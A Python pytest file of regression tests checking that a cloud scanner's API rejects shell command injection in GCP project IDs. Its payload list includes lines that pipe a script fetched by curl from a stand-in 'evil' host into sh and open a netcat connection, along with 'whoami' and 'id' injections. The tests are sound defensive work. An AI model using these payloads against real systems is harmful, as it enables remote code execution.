"""Regression tests for command injection into the gcloud shell sink.

GcloudRunner executes every command through create_subprocess_shell, so any
caller-supplied value that reaches it unvalidated is arbitrary code execution
as the scanner service account.

Two paths were unvalidated:
  - GET /setup/validate took a raw project_id Query and interpolated it into
    `gcloud projects get-iam-policy {project_id}`.
  - POST /scans took specific_projects[] with no validation; for scope=org it
    became the project list verbatim and reached ~200 check commands.
"""

import pydantic
import pytest
from fastapi.testclient import TestClient

from backend.core.models import ScanRequest
from backend.main import app

# Values that would break out of the surrounding shell command.
SHELL_PAYLOADS = [
    "x;whoami",
    "a$(id)",
    "p && curl http://evil/x.sh",
    "q | nc evil 443",
    "r`id`",
    "s;curl -s http://evil|sh #",
    "t\nwhoami",
    "u & sleep 5",
]


@pytest.fixture
def client():
    return TestClient(app)


class TestSetupValidateInjection:
    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_shell_metacharacters_rejected(self, client, payload):
        resp = client.get("/api/v1/setup/validate", params={"project_id": payload})
        assert resp.status_code == 422, (
            f"{payload!r} was not rejected — it reaches create_subprocess_shell"
        )

    def test_wellformed_project_id_passes_validation(self, client):
        # Reaches the gcloud call (which fails without credentials in CI), but
        # the point is that it is not rejected as malformed input.
        resp = client.get(
            "/api/v1/setup/validate", params={"project_id": "my-project-123"}
        )
        assert resp.status_code != 422


class TestScanRequestInjection:
    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_specific_projects_rejects_shell_metacharacters(self, payload):
        with pytest.raises(pydantic.ValidationError):
            ScanRequest(
                scope="org", target_id="123456789012", specific_projects=[payload]
            )

    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_scan_endpoint_rejects_shell_metacharacters(self, client, payload):
        resp = client.post(
            "/api/v1/scans",
            json={
                "scope": "org",
                "target_id": "123456789012",
                "specific_projects": [payload],
            },
        )
        assert resp.status_code == 422, (
            f"{payload!r} was not rejected — it reaches ~200 check commands"
        )

    def test_valid_project_ids_are_normalized(self):
        req = ScanRequest(
            scope="org",
            target_id="123456789012",
            specific_projects=["My-Project-123", " other-project "],
        )
        assert req.specific_projects == ["my-project-123", "other-project"]

    def test_one_bad_entry_rejects_the_whole_list(self):
        with pytest.raises(pydantic.ValidationError):
            ScanRequest(
                scope="org",
                target_id="123456789012",
                specific_projects=["good-project-1", "bad;whoami"],
            )

    def test_empty_list_is_allowed(self):
        req = ScanRequest(scope="org", target_id="123456789012")
        assert req.specific_projects == []
